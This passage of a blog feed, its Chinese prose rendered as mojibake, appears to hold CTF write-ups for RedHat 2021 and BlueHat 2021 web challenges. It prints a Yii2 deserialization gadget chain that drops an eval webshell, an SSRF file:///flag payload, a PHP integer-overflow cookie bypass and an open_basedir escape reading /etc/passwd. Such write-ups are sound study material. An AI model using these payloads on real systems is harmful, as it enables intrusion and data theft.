important">?></span></span></code></pre><p>banäº†ä¸€å †å‡½æ•°ï¼Œå…ˆçœ‹çœ‹phpinfo</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>è®¿é—®<code>hack.php</code></p><p>æœç´¢å­—ç¬¦ä¸²ï¼Œç»“æœå‘ç°flagå†™åœ¨äº†ç¯å¢ƒå˜é‡é‡Œï¼Œè¢«phpinfoæš´éœ²å‡ºæ¥äº†</p><img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy"><p>è¯´å®è¯ï¼Œ<code>1ndexx.php</code>å’Œ<code>index.php</code> åˆ‡æ¢è¿·æƒ‘äººï¼Œç„¶åå¹³å°çš„é—®é¢˜ï¼Œç›²çŒœdockeråˆ†å‘å†™ç¯å¢ƒå˜é‡ï¼Œæœ€åæ²¡åˆ 23333</p><hr><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>æ‰«åˆ°<code>www.zip</code>ï¼Œçœ‹ä¸‹æ˜¯<a href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p><p>å»å®˜ç½‘ä¸‹åŸç‰ˆæ¯”å¯¹ä¸€ä¸‹ï¼Œå‘ç°å°±æ”¹äº†ä¸ªå‚æ•°</p><h4 id="Yii2ååºåˆ—åŒ–æ¼æ´"><a href="#Yii2ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Yii2ååºåˆ—åŒ–æ¼æ´"></a><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2ååºåˆ—åŒ–æ¼æ´</a></h4><p>æ‹¿pocç›´æ¥æ‰“ï¼Œç”±äºbase64åå¯èƒ½ä¼šæœ‰<code>/</code>æˆ–è€…<code>+</code>ç­‰ï¼Œæ‰€ä»¥å…ˆbase64ä¸€ä¸‹å†™å‡½æ•°è§£ç å³å¯</p><p>systemä¼¼ä¹è¢«banäº†ä¸è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// poc2</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token comment">// ç”Ÿæˆpoc</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é‡ŒåŸpocæ‰“çš„å‚æ•°æ˜¯dataï¼Œè¿™é‡Œä¿®æ”¹ä¸ºmessage</p><img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy"><p>æ‰“è¿‡å»å°±è¡Œï¼Œè™½ç„¶æŠ¥é”™ä½†æ˜¯å·²ç»æ‰§è¡Œäº†</p><img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy"><p>åœ¨å½“å‰ç›®å½•ä¼šç”Ÿæˆ<code>1.php</code>ï¼Œèšå‰‘è¿ä¸€ä¸‹</p><img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy"><p>å‘ç°æœ‰disable_functionï¼Œå½“æ—¶å¿ƒå‡‰ä¸€æˆªï¼Œä¸ä¼šå’Œè“å¸½ä¸€æ ·â€¦</p><p>ä¾¥å¹¸å¿ƒç†æµ‹äº†ä¸‹èšå‰‘çš„çªç ´æ’ä»¶ï¼Œå‘ç°<code>Apache_mod_cgi</code>å¯ä»¥ï¼Œæ‰§è¡Œæ ¹ç›®å½•ä¸‹<code>/readflag</code>å³å¯</p><img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy"><hr><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>æ‰“å¼€ç™»é™†ç•Œé¢ï¼Œä¼°è®¡æ˜¯æ³¨å…¥</p><p>çœ‹çœ‹è¿æ¥ï¼Œå‘ç°å¼‚å¸¸è¯·æ±‚ï¼Œè¿˜å¥½æ²¡ä¸Šæ¥å¯¹ç€<code>username</code>ä¹±è¯•</p><img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy"><p>ç»æµ‹è¯•ï¼Œå¯ä»¥ä½¿ç”¨å¼‚æˆ– ç›²æ³¨</p><pre class="language-none"><code class="language-none">é”™è¯¯è¯­å¥è¿”å›æŠ¥é”™æ­£ç¡®è¯­å¥é”™è¯¯è¡¨è¾¾è¿”å›ï¼šWHAT ARE YOU DOINGæ­£ç¡®è¯­å¥idä¸º1è¿”å›å›¾ç‰‡æ­£ç¡®è¯­å¥idä¸º0è¿”å›ç©º</code></pre><img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy"><img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy"><img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy"><p>å¼‚æˆ–ç›²æ³¨è„šæœ¬è·‘ï¼Œå¯è§ä»¥å‰å†™çš„WP</p><p>æ‹¿åˆ°ä¿¡æ¯å¦‚ä¸‹</p><pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre><p>ä¼¼ä¹å¯†ç è¿˜æ˜¯å®¹å™¨éšæœºçš„ï¼Œæ‹¿åˆ°ç”¨æˆ·åå¯†ç ç™»é™†</p><img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy"><p>æ˜æ˜¾ssrfï¼Œç”¨fileåè®®è¯»ä¸€ä¸‹æ–‡ä»¶å¯è¡Œï¼Œç›´æ¥è¯»flag</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre><img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è“å¸½æ¯2021ä¸€é“é¢˜â€”â€”One_Pointer_PHP</title>
      <link href="article/bluehat2021/"/>
      <url>article/bluehat2021/</url>
      
        <content type="html"><![CDATA[<p>æ·±å…¥å­¦ä¹ è“å¸½æ¯webä¸€é“é¢˜</p><a id="more"></a><p>è´¨é‡å¾ˆé«˜çš„ä¸€é“é¢˜ï¼Œè¯¦ç»†å†™ä¸‹åšä¸ªæ€»ç»“ï¼Œæ·±å…¥å­¦ä¹ ä¸€ä¸‹çŸ¥è¯†ç‚¹</p><h2 id="WEB-One-Pointer-PHP"><a href="#WEB-One-Pointer-PHP" class="headerlink" title="WEB-One_Pointer_PHP"></a>WEB-One_Pointer_PHP</h2><h3 id="ç¬¬ä¸€å±‚"><a href="#ç¬¬ä¸€å±‚" class="headerlink" title="ç¬¬ä¸€å±‚"></a>ç¬¬ä¸€å±‚</h3><p>ç»™äº†<code>www.zip</code>ï¼Œéƒ¨åˆ†æºç ï¼Œåˆ†æä¸€ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ååºåˆ—åŒ–<code>cookies-&gt;data</code>ä½¿å…¶$count[++$user-&gt;count]=1;å<code>$count[]=1</code>ä¸ºfalseå³å¯evalæ‰§è¡Œå‘½ä»¤ï¼Œä¼´éšåº”è¯¥é¢˜ç›®è¿˜æœ‰æ›´å¤šè€ƒç‚¹ï¼Œæµ‹è¯•å¦‚ä¸‹ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"die"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><img src="/article/bluehat2021/image-20210503132210543.png" class="" title="count-test" loading="lazy"><p>åœ¨ PHP ä¸­ï¼Œæœ‰ä¸‰ç§æ•°ç»„ç±»å‹ï¼š</p><ul><li><p>ç´¢å¼•æ•°ç»„ - å¸¦æœ‰æ•°å­—ç´¢å¼•çš„æ•°ç»„</p><p> <code>$a = array(&quot;1&quot; =&gt; &quot;admin&quot;, &quot;0&quot; =&gt; &quot;gyy&quot;);</code>  // keyè¢«åŒå¼•å·åŒ…è£¹</p></li><li><p>å…³è”æ•°ç»„ - å¸¦æœ‰æŒ‡å®šé”®çš„æ•°ç»„</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token number">9223372036854775805</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span> => <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>\r\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç»“æœå¦‚ä¸‹</span><span class="token comment">//array(3) &#123;</span><span class="token comment">//    [9223372036854775806]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [9223372036854775807]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [-9223372036854775808]=></span><span class="token comment">//  int(1)</span><span class="token comment">//&#125;</span><span class="token comment">//9223372036854775806 => 1</span><span class="token comment">//9223372036854775807 => 1</span><span class="token comment">//-9223372036854775808 => 1</span><span class="token comment">//bool(true)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>å¤šç»´æ•°ç»„ - åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ•°ç»„</p><p>ä¿—ç§°å¥—å¨ƒ</p></li></ul><p>æ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥è‡ªå·±æµ‹è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œåªéœ€è¦<code>$a-&gt;count=9223372036854775806</code>å³longæœ€å¤§å€¼æ—¶å³å¯ç»•è¿‡(64ä½å³2^64)</p><h3 id="è·å–webshell"><a href="#è·å–webshell" class="headerlink" title="è·å–webshell"></a>è·å–webshell</h3><p>ç›´æ¥æ‹¿shellè¿›å»çœ‹çœ‹</p><img src="/article/bluehat2021/image-20210503134715662.png" class="" title="shell" loading="lazy"><p>è¿™é‡Œç”¨èšå‰‘ç¤ºä¾‹ï¼Œæ³¨æ„headeré‡Œéœ€è¦åŠ Cookieä¸º<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</code></p><p>æŸ¥çœ‹phpinfoï¼Œå‘ç°æœ‰å¾ˆå¤šdisable_function</p><pre class="language-none"><code class="language-none">disable_functionï¼šstream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursivedisable_classes:Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>è¿˜æœ‰open_basediré™åˆ¶ï¼Œåˆ©ç”¨è‡ªåŠ¨åŒ–è„šæœ¬æ— æ³•çªç ´ã€‚ç”±äºhtmlç›®å½•å¯å†™ï¼Œåˆ©ç”¨<code>glob://</code>åè®®å…ˆæ¢æµ‹ç›®å½•</p><blockquote><p>glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</p></blockquote><pre class="language-none"><code class="language-none">&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;&#125;?&gt;</code></pre><img src="/article/bluehat2021/image-20210503135244699.png" class="" title="flag" loading="lazy"><p>å†åˆ©ç”¨å¦‚ä¸‹ï¼Œè¯»å–æ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>è¯»å–php.ini</p><p><code> /usr/local/etc/php/php.ini</code></p><img src="/article/bluehat2021/image-20210503140055221.png" class="" title="ext" loading="lazy"><p>å‘ç°å¼‚å¸¸.soæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯è¦åŠ è½½ç„¶åpwnå®ƒï¼Œå®åœ¨ä¸ä¼šã€‚</p><h3 id="è¯»å–é…ç½®æ–‡ä»¶"><a href="#è¯»å–é…ç½®æ–‡ä»¶" class="headerlink" title="è¯»å–é…ç½®æ–‡ä»¶"></a>è¯»å–é…ç½®æ–‡ä»¶</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// normal files</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///etc/nginx/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¯»<code>/etc/nginx/nginx.conf</code>ï¼Œå‘ç°æœ‰<code>include /etc/nginx/sites-enabled/*;</code></p><p>è½¬å¤´è¯»å–<code>/etc/nginx/sites-enabled/default</code></p><img 